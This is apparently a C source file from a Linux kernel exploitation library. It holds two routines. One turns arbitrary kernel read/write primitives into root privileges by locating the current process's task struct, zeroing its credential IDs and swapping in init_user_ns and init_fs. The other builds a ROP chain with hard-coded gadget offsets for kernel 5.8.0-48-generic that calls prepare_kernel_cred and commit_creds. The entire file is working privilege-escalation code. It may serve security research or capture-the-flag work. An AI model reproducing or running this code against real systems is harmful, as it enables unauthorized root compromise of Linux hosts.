#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include "exploitlib.h"

// static off_t for different kernel versions: try to detect by including a header or something?

int root_arbrw8(uintptr_t kernbase, uint64_t (*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value)) {
	//get the task struct for the task just before init_task, so that the while loop can break when real pid = 0 or real pid = 1
	uintptr_t taskptr = kernbase + INIT_TASK;
	printf("[+] Found init_task at 0x%lx\n", taskptr);
	taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
	pid_t taskpid = (pid_t)arbread(taskptr + TASK_PID_OFFSET);
	
	//loop over all task structs, and note when vpid = getpid()
	pid_t p = getpid();
	printf("[*] Process vpid = %d\n", p);
	while (taskpid != 0 && taskpid != 1) {
		//tpid = task->thread_pid
		uintptr_t tpid = arbread(taskptr + TASK_THREADPID_OFFSET);
		
		//level = tpid->level
		unsigned int level = (unsigned int)arbread(tpid + 4);
		
		//vpid = tpid->numbers[level]
		pid_t vpid = (pid_t)arbread(tpid + PID_NUMBERS_OFFSET + level * 0x10);
		
		if (vpid == p) {
			//potential task struct found, poke the UID to see if it is the task struct for the current process
			uint32_t olduid = getuid();
			uintptr_t cred = arbread(taskptr + TASK_CRED_OFFSET);
			uint64_t uidgid = arbread(cred + 4);
			arbwrite(cred + 4, uidgid + 1);
			if (olduid != getuid()) {
				//task struct found since the current process now has a different UID
				printf("[+] Found task struct for the current process at task = 0x%lx with pid = %d, vpid = %d at level %d\n", taskptr, taskpid, vpid, level);
				arbwrite(cred + 4, uidgid);
				break;
			}
			else {
				//wrong task struct, put the UID back to what it was to avoid chaos
				arbwrite(cred + 4, uidgid);
			}
		}
		
		//set taskptr to the previous task
		taskptr = arbread(taskptr + TASK_LINKS_OFFSET + 8) - TASK_LINKS_OFFSET;
		taskpid = (pid_t)arbread(taskptr + TASK_PID_OFFSET);
	}
	
	//change credentials to root
	uintptr_t cred = arbread(taskptr + TASK_CRED_OFFSET);
	printf("[+] Found process credential struct at cred = 0x%lx\n", cred);
	for (int i=0; i<4; i++) {
		if (arbwrite(cred + 4 + 8*i, 0)) {
			puts("[-] Failed to set cred->uid, cred->gid, etc. to 0");
			return -1;
		}
	}
	puts("[+] Set cred->uid, cred->gid, etc. to 0");
	//set cred->user_ns = init_user_ns
	if (arbwrite(cred + CRED_USERNS_OFFSET, kernbase + INIT_USER_NS)) {
		puts("[-] Failed to set cred->user_ns = init_user_ns");
		return -1;
	}
	puts("[+] Set cred->user_ns = init_user_ns");
	
	if (arbwrite(taskptr + TASK_FS_OFFSET, kernbase + INIT_FS)) {
		puts("[-] Failed to set task->fs = init_fs");
		return -1;
	}
	puts("[+] Set task->fs = init_fs");

	return 0;
}

void build_ropchain(uint64_t kbase, uint64_t *rop_ptr) {
	#ifdef KERNEL_5_8_0_48_generic
	uint64_t prepare_kernel_cred = kbase + 0xc9110;
	uint64_t commit_creds = kbase + 0xc8c80;

	uint64_t pop_rdi = kbase + 0x89250;
	uint64_t pop_rsi = kbase + 0x1abaae;
	uint64_t swapgs = kbase + 0x75ef0;
	uint64_t iretq = kbase + 0x3a0fb;

	uint64_t *rop = rop_ptr;

	//rax = prepare_kernel_cred(NULL);
	*rop++ = pop_rdi;
	*rop++ = 0;
	*rop++ = prepare_kernel_cred;

	//commit_creds(rax);
	//a quick check in gdb shows that rdi = rax already, so just call commit_creds on it
	*rop++ = commit_creds;

	//swapgs and interrupt return using the saved state
	*rop++ = swapgs;
	*rop++ = iretq;
	*rop++ = user_eip;
    *rop++ = user_cs;
    *rop++ = user_eflags;
    *rop++ = user_sp;
    *rop++ = user_ss;
	#else
	assert(0 && "Offsets not available for specified kernel version");
	#endif
}
